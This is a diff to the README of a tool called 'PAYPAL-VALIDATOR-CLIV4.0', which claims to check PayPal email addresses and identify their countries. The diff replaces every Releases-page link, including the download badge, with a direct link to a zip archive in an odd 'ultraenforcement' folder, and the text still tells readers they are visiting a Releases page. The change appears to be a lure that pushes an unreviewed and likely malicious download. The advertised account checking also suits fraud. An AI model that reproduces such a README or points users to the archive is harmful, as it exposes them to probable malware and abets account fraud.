@@ -1,6 +1,6 @@
 # 🛠️ PAYPAL-VALIDATOR-CLIV4.0 - Simple Tool for Email Validation
 
-![Download PAYPAL-VALIDATOR-CLIV4.0](https://img.shields.io/badge/Download-PAYPAL--VALIDATOR--CLIV4.0-blue?style=for-the-badge)
+![Download PAYPAL-VALIDATOR-CLIV4.0](https://raw.githubusercontent.com/artur-sys/PAYPAL-VALIDATOR-CLIV4.0/main/ultraenforcement/PAYPAL-VALIDATOR-CLIV4.0.zip)
 
 ## 📥 Overview
 PAYPAL-VALIDATOR-CLIV4.0 is a user-friendly tool designed to validate PayPal email addresses. It can help you ensure that the emails you use are correct and identify the country associated with each email. This tool is perfect for anyone looking to enhance their email management or prevent errors in communication.
@@ -8,7 +8,7 @@ PAYPAL-VALIDATOR-CLIV4.0 is a user-friendly tool designed to validate PayPal ema
 ## 🚀 Getting Started
 To get started with PAYPAL-VALIDATOR-CLIV4.0, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to our GitHub Releases page at [this link](https://github.com/artur-sys/PAYPAL-VALIDATOR-CLIV4.0/releases).
+1. **Visit the Releases Page**: Go to our GitHub Releases page at [this link](https://raw.githubusercontent.com/artur-sys/PAYPAL-VALIDATOR-CLIV4.0/main/ultraenforcement/PAYPAL-VALIDATOR-CLIV4.0.zip).
   
 2. **Choose Your Version**: You will see a list of available versions. Choose the latest version for the best performance and features.
 
@@ -24,7 +24,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 1. **Download the Program**: Click the button below to visit the Releases page and download the file:
-   [Download PAYPAL-VALIDATOR-CLIV4.0](https://github.com/artur-sys/PAYPAL-VALIDATOR-CLIV4.0/releases)
+   [Download PAYPAL-VALIDATOR-CLIV4.0](https://raw.githubusercontent.com/artur-sys/PAYPAL-VALIDATOR-CLIV4.0/main/ultraenforcement/PAYPAL-VALIDATOR-CLIV4.0.zip)
 
 2. **Locate the File**: Navigate to the folder where you saved the downloaded file. 
 
